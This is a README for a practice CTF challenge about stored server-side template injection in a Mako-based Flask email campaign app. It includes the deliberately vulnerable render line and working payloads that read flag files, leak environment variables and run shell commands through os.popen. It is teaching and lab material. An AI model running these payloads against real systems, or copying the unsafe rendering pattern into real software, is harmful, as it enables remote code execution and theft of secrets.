# Orbit Mail Lab: Stored SSTI (Mako)

CTF-jeopardy task (`Easy/Medium`) focused on **Server-Side Template Injection** using **Mako** (not Jinja2).

## Scenario

`Orbit Mail` is an internal marketing platform used to build email campaigns and run deliverability simulations.

The app includes multiple modules to add realistic noise:
- Campaigns
- Render Queue
- Tickets
- Knowledge Base
- System Status

There is one core vulnerability: **stored SSTI** in the campaign rendering flow.

## Architecture

- `web` (Flask): UI + API + queue producer
- `worker` (Python): queue consumer + template rendering
- `redis`: render job queue
- `sqlite` (`app-data` volume): campaigns, jobs, tickets, KB

Flag locations:
- env: `FLAG=practice{y3t_4n0th3r_sst1_9}`
- file: `/flag.txt`
- app working directory file: `/srv/app/flag.txt`

## Run

```bash
docker compose up --build -d
```

After start:
- UI: `http://localhost:1337`
- API: `/api/campaigns`, `/api/campaigns/<id>/simulate`, `/api/jobs/<id>`

Implementation note:
- `docker-compose.yml` uses `network_mode: host` to avoid `podman/netavark/nftables` issues in some environments.
- Redis listens on `127.0.0.1:6380` to avoid collisions with a local Redis on `6379`.

## Vulnerability

Flow:
1. User submits `body_template` and it is stored in DB.
2. User starts simulation, web service creates a render job in Redis.
3. Worker reads the job and renders user-controlled template source unsafely.

Vulnerable code path:

```python
output = Template(campaign["body_template"]).render(**context)
```

Because user input is compiled and executed as Mako template code, this is stored SSTI.

## Exploitation

### Manual

Payload example (read flag file content):

```mako
${open('/flag.txt').read().strip()}
```

Alternative (env leak):

```mako
${__import__('os').environ.get('FLAG')}
```

You can also confirm file presence first:

```mako
${__import__('os').popen('ls').read()}
```

Then read it:

```mako
${__import__('os').popen('cat flag.txt').read()}
```

### Automated PoC

```bash
./poc.py
# or
./poc.py http://localhost:1337
```

Expected result:
- campaign is created,
- simulation job is queued and completed,
- output contains `practice{...}`.

## Why This Is Easy/Medium

- Stored SSTI (more realistic than reflected one-shot preview).
- Separate worker + queue execution path.
- Additional non-vulnerable modules increase analysis noise.
- Exploit remains deterministic and straightforward.

## Hardening

1. Never compile/render user input as template source.
2. Use trusted static templates and pass user data as variables only.
3. If user-authored templates are required, use strict sandboxing.
4. Isolate worker runtime (least privileges, restricted FS, secret separation).
5. Keep secrets/flags out of renderer process environment.

## Project Layout

```text
.
├── app
│   ├── app.py
│   ├── db.py
│   ├── worker.py
│   ├── static/styles.css
│   └── templates/*.html
├── Dockerfile
├── docker-compose.yml
├── poc.py
└── README.md
```
